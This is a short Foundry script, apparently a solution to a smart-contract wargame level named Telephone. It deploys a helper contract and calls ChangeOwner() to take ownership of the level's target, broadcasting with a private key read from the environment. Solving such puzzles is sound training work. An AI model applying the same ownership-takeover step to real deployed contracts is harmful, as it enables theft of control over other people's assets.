// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/level04.sol";
import "forge-std/console.sol";

contract TelephoneHack is Script 
{
    
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        TelephoneCall telephoneCallInstance = new TelephoneCall();
        telephoneCallInstance.ChangeOwner();

        vm.stopBroadcast();
    }
}